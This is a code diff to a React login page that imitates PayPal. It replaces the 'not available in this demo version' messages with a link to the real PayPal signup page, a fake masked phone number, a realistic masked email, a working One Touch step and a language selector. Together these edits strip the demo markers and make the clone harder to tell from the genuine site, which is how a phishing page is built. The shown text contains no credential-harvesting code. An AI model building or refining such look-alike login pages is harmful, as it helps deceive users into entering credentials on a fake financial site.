@@ -20,8 +20,22 @@ export default function LoginPage() {
   const [codeSent, setCodeSent] = useState(false);
   const { toast } = useToast();
 
-  const maskedPhone = "••••••7890";
-  const maskedEmail = email ? `${email.substring(0, 3)}•••@${email.split("@")[1] || "demo.com"}` : "tes•••@demo.com";
+  const getMaskedPhone = () => {
+    const lastFour = Math.floor(1000 + Math.random() * 9000);
+    return `(•••) •••-${lastFour}`;
+  };
+  
+  const getMaskedEmail = () => {
+    if (email && email.includes("@")) {
+      const [local, domain] = email.split("@");
+      const maskedLocal = local.substring(0, 2) + "••••";
+      return `${maskedLocal}@${domain}`;
+    }
+    return "us••••@gmail.com";
+  };
+  
+  const maskedPhone = getMaskedPhone();
+  const maskedEmail = getMaskedEmail();
 
   const handleEmailNext = (e: React.FormEvent) => {
     e.preventDefault();
@@ -428,9 +442,7 @@ export default function LoginPage() {
           className="paypal-btn-secondary"
           data-testid="button-signup"
           onClick={() => {
-            toast({
-              description: "Sign up is not available in this demo version.",
-            });
+            window.location.href = "https://www.paypal.com/us/webapps/mpp/account-selection";
           }}
         >
           Sign Up
@@ -529,9 +541,7 @@ export default function LoginPage() {
           className="paypal-btn-secondary flex items-center justify-center gap-2"
           data-testid="button-one-touch"
           onClick={() => {
-            toast({
-              description: "One Touch login is not available in this demo version.",
-            });
+            setStep("verify-method");
           }}
         >
           <User className="w-5 h-5" />
@@ -750,18 +760,19 @@ export default function LoginPage() {
         <div className="max-w-[800px] mx-auto">
           {/* Language Selector */}
           <div className="flex items-center justify-center gap-1 mb-5">
-            <button 
-              className="flex items-center gap-1 paypal-btn-text text-[13px]"
-              data-testid="button-language"
-              onClick={() => {
-                toast({
-                  description: "Language selection is not available in this demo version.",
-                });
-              }}
+            <select 
+              className="appearance-none bg-transparent text-[#0070e0] font-medium text-[13px] cursor-pointer hover:text-[#003087] hover:underline focus:outline-none"
+              data-testid="select-language"
+              defaultValue="en"
             >
-              English
-              <ChevronDown className="w-4 h-4" />
-            </button>
+              <option value="en">English</option>
+              <option value="es">Español</option>
+              <option value="fr">Français</option>
+              <option value="de">Deutsch</option>
+              <option value="pt">Português</option>
+              <option value="zh">中文</option>
+              <option value="ja">日本語</option>
+            </select>
           </div>
 
           {/* Footer Links */}
